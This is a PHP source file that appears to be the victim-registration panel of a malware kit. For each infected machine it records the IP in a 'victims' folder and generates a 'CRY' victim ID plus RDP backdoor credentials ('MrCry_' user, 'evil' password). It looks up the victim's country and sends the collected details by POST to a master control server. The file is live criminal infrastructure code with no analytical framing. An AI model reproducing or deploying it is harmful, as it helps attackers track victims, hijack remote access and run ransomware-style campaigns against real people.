<?php
error_reporting(0);
set_time_limit(0);

include('config.php');

function GenerateID($length){
    $characters = '0123456789QWERTYUIOPASDFGHJKLZXCVBN';
    $string = '';    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters))];
    }

    return $string;
}

function GenerateKey($length){
    $characters = '0123456789QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklmnbvcxz!@#$%^&*()_+[]{}:;';
    $string = '';    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters))];
    }

    return $string;
}

if(!empty($_GET['info']) && !empty($_GET['ip'])) {
	//$ip = base64_decode($_GET['ip']);
	$ip = $_SERVER['REMOTE_ADDR'];
	$real_info = base64_decode($_GET['info']);
	$del[1] = str_replace("('", "", $real_info);
	$del[2] = str_replace("')", "", $del[1]);
	$del[3] = str_replace("', '", " | ", $del[2]);
	$info = $del[3];
	$victim = "victims/".$ip.".js";
	$vID = 'CRY'.GenerateID(8).'';
	$vRDPUser = 'MrCry_'.GenerateID(7).'';
	$vRDPPass = 'evil'.GenerateKey(9).'';
	$information = '{
	"x_ID":"'.$vID.'",
	"x_UDP":"'.$vRDPUser.'",
	"x_PDP":"'.$vRDPPass.'"
}';
	if(!file_exists($victim)) {
		$getip ='http://ip-api.com/json/' . $ip;
		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, $getip);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
		$content = curl_exec($curl);
		curl_close($curl);
		$details = json_decode($content);
		$coun = $details->countryCode;
		if(!empty($coun)) {
			$country = $coun;
		} else {
			$country = "XX";
		}
		$file = fopen($victim, "w");
		$save = fwrite($file, $information);
		if($save) {
			$date = date('d-m-Y');
			$data = "id={$vID}&info={$info}&ip={$ip}&country={$country}&date={$date}";
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $MASTER_URL);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_TIMEOUT,30);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_exec($ch);
			curl_close($ch);
			$view = file_get_contents($victim);
			echo $view;
		}
		fclose($file);
	} else {
		$view = file_get_contents($victim);
		echo $view;
	}
}